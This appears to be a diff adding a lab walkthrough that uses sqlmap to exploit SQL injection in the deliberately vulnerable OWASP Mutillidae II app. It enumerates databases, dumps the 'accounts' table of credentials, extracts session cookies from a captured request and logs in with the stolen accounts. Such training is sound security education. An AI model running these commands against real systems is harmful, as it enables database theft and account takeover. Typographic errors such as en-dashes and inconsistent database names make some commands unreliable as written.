@@ -1,0 +1,24 @@
+OWASP Mutillidae II select OWASP 2013 -> A1 Injection  (SQL) -> SQLMAP Practice -> View Someone’s Blog
+
+> Open a terminal in Kali VM and type the following command to check the databases associated with the request initiated to the OWASP BWA VM:
+sqlmap -r sql_request.txt –dbs
+> Then execute the following command to list the tables associated with the Mutillidae II database and enter ‘y’ option for common table existence check:
+sqlmap -r sql_request.txt –D multillidae --tables
+> Then execute the following command to list-down the accounts linked with the tables shortlisted:
+sqlmap -r sql_request.txt –D multillidae -T accounts --dump
+
+> Execute the following commands to get the session-centric details for the captured POST request:
+grep "Referer" sql_request.txt | awk '{print $2}' 
+grep "author" sql_request.txt
+grep "Cookie" sql_request.txt | sed 's/Cookie: //'
+
+> Execute the following command to list the databases linked with the request initiated for a specific user ‘jeremy’:
+sqlmap -u “<OUTPUT OF REFERER>” --data=“<OUTPUT OF AUTHOR>” --cookie=“<OUTPUT OF COOKIE>” --dbs
+
+> Execute the following command to list the tables linked with the chosen database ‘nowasp’:
+sqlmap -u “<OUTPUT OF REFERER>” --data=“<OUTPUT OF AUTHOR>” --cookie=“<OUTPUT OF COOKIE>” -D nowasp --table
+
+> Try to identify the user-details and their respective credentials saved in the ‘accounts’ table by executing the following command:
+sqlmap -u “<OUTPUT OF REFERER>” --data=“<OUTPUT OF AUTHOR>” --cookie=“<OUTPUT OF COOKIE>” -D nowasp -T accounts --dump
+
+>Try logging into one of the accounts upon successful execution of the previous command
